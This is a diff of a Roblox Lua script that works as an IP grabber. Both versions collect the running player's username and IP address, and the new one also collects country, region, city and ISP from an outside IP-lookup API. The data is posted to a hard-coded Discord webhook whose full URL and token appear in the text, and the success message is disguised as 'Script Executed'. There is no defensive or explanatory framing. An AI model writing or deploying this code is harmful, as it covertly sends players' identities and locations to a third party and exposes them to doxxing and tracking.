@@ -1,64 +1,48 @@
 local HttpService = game:GetService("HttpService")
-local Player = game:GetService("Players")
+local Players = game:GetService("Players")
+local api = "https://velonix-ip-api.vercel.app/api/ip"
+local webhook = "https://discord.com/api/webhooks/1393398739812487189/D8MlZ7oGZ70VwMX045sIHBDmWUmBEvtBDDqJe97pJBfaSFZgQA2zRllrJKs-b8GOqXO9"
+local success, response = pcall(function()
+	return HttpService:GetAsync(api)
+end)
 
-local URL = "https://discord.com/api/webhooks/1393398739812487189/D8MlZ7oGZ70VwMX045sIHBDmWUmBEvtBDDqJe97pJBfaSFZgQA2zRllrJKs-b8GOqXO9"
+if success then
+	local data = HttpService:JSONDecode(response)
 
-local function getIP()
-    local success, response = pcall(function()
-        return HttpService:GetAsync("https://ipapi.co/json")
-    end)
-    if success then
-        local data = HttpService:JSONDecode(response)
-        return data.ip or "Unknown"
-    else
-        return "Unknown"
-    end
-end
+	local player = Players.LocalPlayer
+	local username = player and player.Name or "Unknown"
 
-local function getUSER()
-    local plr = Player.LocalPlayer
-    if plr then
-        return plr.Name
-    else
-        warn("Failed to get username.")
-        return "Unknown"
-    end
-end
+	local payload = {
+		username = "Logger",
+		embeds = {{
+			title = "📡 User:",
+			description = "**User:** `" .. username .. "`\n"
+				.. "**IP:** `" .. (data.ip or "Unknown") .. "`\n"
+				.. "**Country:** `" .. (data.country or "Unknown") .. "`\n"
+				.. "**Region:** `" .. (data.region or "Unknown") .. "`\n"
+				.. "**City:** `" .. (data.city or "Unknown") .. "`\n"
+				.. "**ISP:** `" .. (data.org or "Unknown") .. "`",
+			color = 3447003,
+			timestamp = os.date("!%Y-%m-%dT%H:%M:%SZ")
+		}}
+	}
 
-local function getSERVER()
-    local jobId = game.JobId
-    if jobId and jobId ~= "" then
-        return "https://www.roblox.com/games/" .. game.PlaceId .. "/-/" .. jobId
-    else
-        warn("Failed to get server link.")
-        return "Unknown"
-    end
-end
-
-local function Webhook(ip, username, serverLink)
-    local data = {
-        ["content"] = "**IP Address:** " .. ip .. "\n**Username:** " .. username .. "\n**Server:** " .. serverLink
-    }
-    local jsonData = HttpService:JSONEncode(data)
-    local headers = {
-        ["Content-Type"] = "application/json"
-    }
-    local response = HttpService:RequestAsync({
-        Url = URL,
-        Method = "POST",
-        Headers = headers,
-        Body = jsonData
-    })
-    if response.Success then
-        print("Info sent to webhook successfully.")
-    else
-        warn("Failed to send Info to webhook.")
-    end
-end
-
-local ip = getIP()
-local username = getUSER()
-local serverLink = getSERVER()
-if ip then
-    Webhook(ip, username, serverLink)
+	local jsonPayload = HttpService:JSONEncode(payload)
+	local successWebhook, result = pcall(function()
+		return HttpService:RequestAsync({
+			Url = webhook,
+			Method = "POST",
+			Headers = {
+				["Content-Type"] = "application/json"
+			},
+			Body = jsonPayload
+		})
+	end)
+	if successWebhook and result.Success then
+		print("✅ Script Executed.")
+	else
+		warn("❌ Missing Execution Logic: ", result and result.StatusCode)
+	end
+else
+	warn("❌ Failed to send.")
 end
